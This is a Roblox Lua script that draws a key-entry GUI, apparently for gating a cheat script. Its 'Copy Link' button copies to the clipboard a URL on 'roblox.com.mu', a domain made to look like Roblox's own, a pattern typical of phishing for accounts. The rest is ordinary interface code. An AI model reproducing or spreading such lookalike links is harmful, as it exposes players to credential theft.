-- Key System GUI
-- Place this in a LocalScript (StarterGui or StarterPlayerScripts)

--// CONFIGURATION \\--
local KEY_LINK = "https://www.roblox.com.mu/communities/3295072748/sunsc1ptz" -- Change this anytime
local VALID_KEYS = {
    "DEMO-KEY-2024",
    "VIP-ACCESS-001",
    -- Add more valid keys here
}
--// END CONFIGURATION \\--

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KeySystemGui"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = playerGui

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 420, 0, 280)
MainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
MainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 12)
MainCorner.Parent = MainFrame

-- Gradient accent line at top
local AccentLine = Instance.new("Frame")
AccentLine.Name = "AccentLine"
AccentLine.Size = UDim2.new(1, 0, 0, 3)
AccentLine.Position = UDim2.new(0, 0, 0, 0)
AccentLine.BorderSizePixel = 0
AccentLine.Parent = MainFrame

local AccentGradient = Instance.new("UIGradient")
AccentGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(138, 43, 226)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(75, 0, 130)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(138, 43, 226))
})
AccentGradient.Parent = AccentLine

local AccentCorner = Instance.new("UICorner")
AccentCorner.CornerRadius = UDim.new(0, 12)
AccentCorner.Parent = AccentLine

-- Title
local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Position = UDim2.new(0, 0, 0, 15)
Title.BackgroundTransparency = 1
Title.Text = "🔐 KEY SYSTEM"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 24
Title.Font = Enum.Font.GothamBold
Title.Parent = MainFrame

-- Subtitle
local Subtitle = Instance.new("TextLabel")
Subtitle.Name = "Subtitle"
Subtitle.Size = UDim2.new(1, 0, 0, 20)
Subtitle.Position = UDim2.new(0, 0, 0, 55)
Subtitle.BackgroundTransparency = 1
Subtitle.Text = "Enter your key to unlock the script"
Subtitle.TextColor3 = Color3.fromRGB(140, 140, 160)
Title.TextSize = 13
Subtitle.Font = Enum.Font.Gotham
Subtitle.Parent = MainFrame

-- Key Input Box
local KeyInput = Instance.new("TextBox")
KeyInput.Name = "KeyInput"
KeyInput.Size = UDim2.new(0, 360, 0, 45)
KeyInput.Position = UDim2.new(0.5, -180, 0, 95)
KeyInput.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
KeyInput.BorderSizePixel = 0
KeyInput.Text = ""
KeyInput.PlaceholderText = "Enter your key here..."
KeyInput.PlaceholderColor3 = Color3.fromRGB(100, 100, 120)
KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
KeyInput.TextSize = 14
KeyInput.Font = Enum.Font.Gotham
KeyInput.ClearTextOnFocus = false
KeyInput.Parent = MainFrame

local KeyInputCorner = Instance.new("UICorner")
KeyInputCorner.CornerRadius = UDim.new(0, 8)
KeyInputCorner.Parent = KeyInput

local KeyInputStroke = Instance.new("UIStroke")
KeyInputStroke.Color = Color3.fromRGB(60, 60, 80)
KeyInputStroke.Thickness = 1
KeyInputStroke.Parent = KeyInput

-- Button Container
local ButtonContainer = Instance.new("Frame")
ButtonContainer.Name = "ButtonContainer"
ButtonContainer.Size = UDim2.new(0, 360, 0, 50)
ButtonContainer.Position = UDim2.new(0.5, -180, 0, 160)
ButtonContainer.BackgroundTransparency = 1
ButtonContainer.Parent = MainFrame

-- Check Key Button (Left)
local CheckKeyBtn = Instance.new("TextButton")
CheckKeyBtn.Name = "CheckKeyBtn"
CheckKeyBtn.Size = UDim2.new(0, 170, 0, 45)
CheckKeyBtn.Position = UDim2.new(0, 0, 0, 0)
CheckKeyBtn.BackgroundColor3 = Color3.fromRGB(138, 43, 226)
CheckKeyBtn.BorderSizePixel = 0
CheckKeyBtn.Text = "✓ Check Key"
CheckKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CheckKeyBtn.TextSize = 15
CheckKeyBtn.Font = Enum.Font.GothamBold
CheckKeyBtn.AutoButtonColor = false
CheckKeyBtn.Parent = ButtonContainer

local CheckKeyCorner = Instance.new("UICorner")
CheckKeyCorner.CornerRadius = UDim.new(0, 8)
CheckKeyCorner.Parent = CheckKeyBtn

-- Copy Link Button (Right)
local CopyLinkBtn = Instance.new("TextButton")
CopyLinkBtn.Name = "CopyLinkBtn"
CopyLinkBtn.Size = UDim2.new(0, 170, 0, 45)
CopyLinkBtn.Position = UDim2.new(1, -170, 0, 0)
CopyLinkBtn.BackgroundColor3 = Color3.fromRGB(45, 45, 60)
CopyLinkBtn.BorderSizePixel = 0
CopyLinkBtn.Text = "📋 Copy Link"
CopyLinkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyLinkBtn.TextSize = 15
CopyLinkBtn.Font = Enum.Font.GothamBold
CopyLinkBtn.AutoButtonColor = false
CopyLinkBtn.Parent = ButtonContainer

local CopyLinkCorner = Instance.new("UICorner")
CopyLinkCorner.CornerRadius = UDim.new(0, 8)
CopyLinkCorner.Parent = CopyLinkBtn

local CopyLinkStroke = Instance.new("UIStroke")
CopyLinkStroke.Color = Color3.fromRGB(138, 43, 226)
CopyLinkStroke.Thickness = 1.5
CopyLinkStroke.Parent = CopyLinkBtn

-- Status Label
local StatusLabel = Instance.new("TextLabel")
StatusLabel.Name = "StatusLabel"
StatusLabel.Size = UDim2.new(1, 0, 0, 25)
StatusLabel.Position = UDim2.new(0, 0, 0, 220)
StatusLabel.BackgroundTransparency = 1
StatusLabel.Text = ""
StatusLabel.TextColor3 = Color3.fromRGB(140, 140, 160)
StatusLabel.TextSize = 13
StatusLabel.Font = Enum.Font.Gotham
StatusLabel.Parent = MainFrame

-- Footer
local Footer = Instance.new("TextLabel")
Footer.Name = "Footer"
Footer.Size = UDim2.new(1, 0, 0, 20)
Footer.Position = UDim2.new(0, 0, 1, -25)
Footer.BackgroundTransparency = 1
Footer.Text = "made with ❤️"
Footer.TextColor3 = Color3.fromRGB(80, 80, 100)
Footer.TextSize = 11
Footer.Font = Enum.Font.Gotham
Footer.Parent = MainFrame

--// ANIMATIONS & FUNCTIONS \\--

local function tweenButton(button, color)
    TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = color}):Play()
end

local function showStatus(text, color)
    StatusLabel.Text = text
    StatusLabel.TextColor3 = color
    StatusLabel.TextTransparency = 0
    wait(2.5)
    TweenService:Create(StatusLabel, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
end

-- Hover effects
CheckKeyBtn.MouseEnter:Connect(function()
    tweenButton(CheckKeyBtn, Color3.fromRGB(158, 63, 246))
end)
CheckKeyBtn.MouseLeave:Connect(function()
    tweenButton(CheckKeyBtn, Color3.fromRGB(138, 43, 226))
end)

CopyLinkBtn.MouseEnter:Connect(function()
    tweenButton(CopyLinkBtn, Color3.fromRGB(60, 60, 80))
end)
CopyLinkBtn.MouseLeave:Connect(function()
    tweenButton(CopyLinkBtn, Color3.fromRGB(45, 45, 60))
end)

-- Check Key functionality
CheckKeyBtn.MouseButton1Click:Connect(function()
    local enteredKey = KeyInput.Text
    
    if enteredKey == "" then
        showStatus("⚠️ Please enter a key!", Color3.fromRGB(255, 180, 0))
        return
    end
    
    local isValid = false
    for _, key in ipairs(VALID_KEYS) do
        if enteredKey == key then
            isValid = true
            break
        end
    end
    
    if isValid then
        showStatus("✅ Key accepted! Loading script...", Color3.fromRGB(0, 255, 100))
        wait(1)
        
        -- Fade out animation
        TweenService:Create(MainFrame, TweenInfo.new(0.5), {
            Size = UDim2.new(0, 0, 0, 0),
            Position = UDim2.new(0.5, 0, 0.5, 0)
        }):Play()
        
        wait(0.5)
        ScreenGui:Destroy()
        
        -- YOUR MAIN SCRIPT GOES HERE
        print("Key validated! Execute your main script here.")
        
    else
        showStatus("❌ Invalid key! Please try again.", Color3.fromRGB(255, 70, 70))
        KeyInput.Text = ""
    end
end)

-- Copy Link functionality
CopyLinkBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(KEY_LINK)
        showStatus("📋 Link copied to clipboard!", Color3.fromRGB(138, 43, 226))
    else
        showStatus("⚠️ Clipboard not supported", Color3.fromRGB(255, 180, 0))
    end
end)

-- Input focus effects
KeyInput.Focused:Connect(function()
    TweenService:Create(KeyInputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(138, 43, 226)}):Play()
end)
KeyInput.FocusLost:Connect(function()
    TweenService:Create(KeyInputStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(60, 60, 80)}):Play()
end)

-- Intro animation
MainFrame.Size = UDim2.new(0, 0, 0, 0)
MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back), {
    Size = UDim2.new(0, 420, 0, 280),
    Position = UDim2.new(0.5, -210, 0.5, -140)
}):Play()